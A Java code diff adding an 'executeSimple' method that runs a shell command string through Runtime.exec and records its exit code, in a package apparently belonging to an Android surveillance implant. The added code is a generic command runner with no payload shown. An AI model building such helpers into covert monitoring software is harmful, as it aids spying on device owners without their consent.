@@ -1,7 +1,12 @@
 package com.android.dvci.util;
 
+import android.app.ActivityManager;
+import android.content.Context;
+
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
+import java.lang.reflect.Field;
+import java.util.List;
 import java.util.concurrent.Callable;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
@@ -87,6 +92,39 @@ public class Execute {
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (execute) Error: " + e);
+			}
+		}
+
+		return result;
+	}
+	public static ExecuteResult executeSimple(String cmd) {
+		String line = null;
+
+		Process localProcess = null;
+		ExecuteResult result = new ExecuteResult(cmd);
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (execute) executing: " + cmd ); //$NON-NLS-1$
+		}
+
+		try {
+			localProcess = Runtime.getRuntime().exec(cmd);
+		} catch (Exception e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+		}
+
+		if (localProcess != null) {
+			try {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (executeSimple): real class "+ localProcess.getClass());
+				}
+				result.exitCode = localProcess.waitFor();
+			} catch (Exception e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (executeSimple) Error: " + e);
+				}
 			}
 		}
 
@@ -193,6 +231,7 @@ public class Execute {
 
 		return result;
 	}
+
 
 	public static boolean executeWaitFor(String cmd) {
 
